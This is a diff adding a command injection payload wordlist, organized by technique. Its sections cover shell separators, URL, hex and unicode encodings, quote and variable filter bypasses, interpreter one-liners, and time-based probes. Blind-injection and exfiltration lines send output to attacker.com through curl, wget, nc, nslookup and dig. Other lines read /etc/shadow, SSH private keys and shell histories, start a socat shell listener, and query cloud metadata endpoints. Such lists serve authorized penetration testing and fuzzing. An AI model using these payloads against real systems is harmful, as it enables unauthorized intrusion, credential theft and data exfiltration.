@@ -1,0 +1,398 @@
+# Advanced Command Injection Payloads
+# Various techniques for bypassing filters and executing commands
+
+# Basic Command Injection
+; whoami
+; id
+; uname -a
+; cat /etc/passwd
+; ls -la
+; pwd
+; env
+; ps aux
+; netstat -an
+; ifconfig
+; ip addr
+; hostname
+; uptime
+; w
+; who
+; last
+; history
+
+# Piped Commands
+| whoami
+| id
+| uname -a
+| cat /etc/passwd
+| ls -la
+| pwd
+| env
+| ps aux
+| netstat -an
+| ifconfig
+| ip addr
+
+# Subshell Execution
+$(whoami)
+$(id)
+$(uname -a)
+$(cat /etc/passwd)
+$(ls -la)
+$(pwd)
+$(env)
+$(ps aux)
+$(netstat -an)
+$(ifconfig)
+
+# Backtick Execution
+`whoami`
+`id`
+`uname -a`
+`cat /etc/passwd`
+`ls -la`
+`pwd`
+`env`
+`ps aux`
+`netstat -an`
+`ifconfig`
+
+# Command Substitution with Spaces
+$( whoami )
+$( id )
+$( uname -a )
+$( cat /etc/passwd )
+$( ls -la )
+`whoami`
+` whoami `
+` id `
+
+# Logical Operators
+&& whoami
+&& id
+&& uname -a
+&& cat /etc/passwd
+|| whoami
+|| id
+|| uname -a
+|| cat /etc/passwd
+
+# Background Execution
+& whoami
+& id
+& uname -a
+& cat /etc/passwd
+
+# URL Encoded
+%3B%20whoami
+%3B%20id
+%3B%20uname%20-a
+%3B%20cat%20%2Fetc%2Fpasswd
+%7C%20whoami
+%7C%20id
+%26%26%20whoami
+%26%26%20id
+
+# Double URL Encoded
+%253B%2520whoami
+%253B%2520id
+%257C%2520whoami
+%257C%2520id
+
+# Unicode Encoded
+\u003B whoami
+\u003B id
+\u007C whoami
+\u007C id
+
+# Hex Encoded
+\x3B whoami
+\x3B id
+\x7C whoami
+\x7C id
+
+# Bypass with Different Separators
+%0a whoami
+%0d whoami
+%0a%0d whoami
+%0d%0a whoami
+
+# Newline Variations
+\n whoami
+\r whoami
+\r\n whoami
+\n\r whoami
+
+# Tab and Space Variations
+\t whoami
+\v whoami
+\f whoami
+
+# Case Variations for Windows
+; WHOAMI
+; ID
+; DIR
+; TYPE
+; COPY
+; DEL
+; REN
+; MD
+; RD
+; CD
+; ECHO
+; SET
+; PATH
+
+# Windows-specific Commands
+; dir
+; type C:\Windows\System32\drivers\etc\hosts
+; net user
+; net localgroup
+; systeminfo
+; tasklist
+; netstat -an
+; ipconfig
+; route print
+; arp -a
+; nslookup
+; ping 127.0.0.1
+; telnet
+; ftp
+; tftp
+
+# PowerShell Injection
+; powershell -c "Get-Process"
+; powershell -c "Get-Service"
+; powershell -c "Get-ComputerInfo"
+; powershell -c "Get-LocalUser"
+; powershell -c "Get-LocalGroup"
+; powershell -c "Get-NetIPConfiguration"
+; powershell -c "Get-Process | Out-String"
+; powershell -ExecutionPolicy Bypass -c "whoami"
+
+# Bash-specific Injection
+; bash -c "whoami"
+; sh -c "whoami"
+; /bin/bash -c "whoami"
+; /bin/sh -c "whoami"
+
+# Python Injection
+; python -c "import os; os.system('whoami')"
+; python3 -c "import os; os.system('whoami')"
+; python -c "import subprocess; subprocess.call(['whoami'])"
+
+# Perl Injection
+; perl -e "system('whoami')"
+; perl -e "exec('whoami')"
+; perl -e "`whoami`"
+
+# Ruby Injection
+; ruby -e "system('whoami')"
+; ruby -e "exec('whoami')"
+; ruby -e "`whoami`"
+
+# Node.js Injection
+; node -e "require('child_process').exec('whoami')"
+; node -e "console.log(require('child_process').execSync('whoami').toString())"
+
+# PHP Injection
+; php -r "system('whoami');"
+; php -r "exec('whoami');"
+; php -r "shell_exec('whoami');"
+; php -r "passthru('whoami');"
+
+# Time-based Command Injection
+; sleep 5
+; ping -c 5 127.0.0.1
+; timeout 5
+| sleep 5
+| ping -c 5 127.0.0.1
+&& sleep 5
+&& ping -c 5 127.0.0.1
+
+# Windows Time-based
+; timeout 5
+; ping -n 5 127.0.0.1
+; powershell -c "Start-Sleep 5"
+
+# Blind Command Injection Markers
+; curl http://attacker.com/
+; wget http://attacker.com/
+; nc attacker.com 4444
+; telnet attacker.com 4444
+; nslookup attacker.com
+; dig @attacker.com
+; ping attacker.com
+
+# DNS Exfiltration
+; nslookup $(whoami).attacker.com
+; dig $(whoami).attacker.com
+; host $(whoami).attacker.com
+
+# HTTP Exfiltration
+; curl http://attacker.com/$(whoami)
+; wget http://attacker.com/$(whoami)
+; curl -d "$(whoami)" http://attacker.com/
+; wget --post-data="$(whoami)" http://attacker.com/
+
+# File Operations
+; cat /etc/passwd > /tmp/out
+; cp /etc/passwd /tmp/
+; mv /etc/passwd /tmp/
+; tar -czf /tmp/backup.tar.gz /etc/
+; zip -r /tmp/backup.zip /etc/
+
+# Network Operations
+; nc -lvp 4444
+; socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh
+; python -m SimpleHTTPServer 8000
+; python3 -m http.server 8000
+
+# Privilege Escalation Attempts
+; sudo whoami
+; su root -c whoami
+; sudo -l
+; cat /etc/sudoers
+; find / -perm -4000 2>/dev/null
+; find / -perm -2000 2>/dev/null
+
+# Information Gathering
+; cat /proc/version
+; cat /etc/issue
+; cat /etc/release
+; cat /etc/redhat-release
+; lsb_release -a
+; cat /proc/cpuinfo
+; cat /proc/meminfo
+; df -h
+; mount
+; lsmod
+; cat /proc/modules
+
+# Process and Service Enumeration
+; ps -aux
+; ps -ef
+; service --status-all
+; systemctl list-units
+; chkconfig --list
+; netstat -tulpn
+; ss -tulpn
+; lsof -i
+
+# User and Group Enumeration
+; cat /etc/passwd
+; cat /etc/group
+; cat /etc/shadow
+; getent passwd
+; getent group
+; id
+; whoami
+; groups
+; last
+; w
+; who
+
+# SSH and Key Enumeration
+; cat ~/.ssh/id_rsa
+; cat ~/.ssh/id_dsa
+; cat ~/.ssh/id_ecdsa
+; cat ~/.ssh/id_ed25519
+; cat ~/.ssh/authorized_keys
+; cat ~/.ssh/known_hosts
+; ls -la ~/.ssh/
+
+# History and Log Enumeration
+; cat ~/.bash_history
+; cat ~/.zsh_history
+; cat ~/.mysql_history
+; cat /var/log/auth.log
+; cat /var/log/syslog
+; cat /var/log/messages
+
+# Configuration File Enumeration
+; cat /etc/hosts
+; cat /etc/resolv.conf
+; cat /etc/network/interfaces
+; cat /etc/sysconfig/network-scripts/ifcfg-eth0
+; cat /etc/fstab
+; cat /etc/crontab
+; cat /var/spool/cron/crontabs/root
+
+# Database Enumeration
+; cat /etc/mysql/my.cnf
+; cat /etc/postgresql/*/main/postgresql.conf
+; find / -name "*.sql" 2>/dev/null
+; find / -name "database*" 2>/dev/null
+
+# Web Server Enumeration
+; cat /etc/apache2/apache2.conf
+; cat /etc/nginx/nginx.conf
+; cat /etc/httpd/conf/httpd.conf
+; find /var/www/ -name "*.php" 2>/dev/null
+; find /var/www/ -name "config*" 2>/dev/null
+
+# Application-specific Injection
+; cat /opt/*/config/*
+; cat /usr/local/*/config/*
+; find /opt/ -name "*.conf" 2>/dev/null
+; find /usr/local/ -name "*.conf" 2>/dev/null
+
+# Container Enumeration
+; docker ps
+; docker images
+; kubectl get pods
+; kubectl get services
+; cat /.dockerenv
+; cat /proc/1/cgroup
+
+# Cloud Metadata
+; curl http://169.254.169.254/latest/meta-data/
+; curl http://169.254.169.254/computeMetadata/v1/
+; curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
+
+# Filter Bypass Techniques
+; wh''oami
+; wh""oami
+; wh\oami
+; wh$()oami
+; wh${PATH:0:1}oami
+; wh$(echo)oami
+; who$'\141'mi
+; who$'\x61'mi
+
+# Alternative Command Separators
+%0a whoami
+%0d whoami
+%0a%0d whoami
+%0d%0a whoami
+%09 whoami
+%20 whoami
+
+# Obfuscated Commands
+; $(echo whoami)
+; $(printf whoami)
+; $(cat<<<whoami)
+; ${PATH:0:1}hoami
+; w${PATH:0:1}oami
+; wh${PATH:0:1}ami
+; who${PATH:0:1}mi
+; whoa${PATH:0:1}i
+; whoam${PATH:0:1}
+
+# Variable Expansion
+; ${HOME}
+; ${PATH}
+; ${USER}
+; ${SHELL}
+; $HOME
+; $PATH
+; $USER
+; $SHELL
+
+# Command Substitution with Variables
+; $(echo $USER)
+; $(echo $HOME)
+; $(echo $PATH)
+; `echo $USER`
+; `echo $HOME`
+; `echo $PATH`
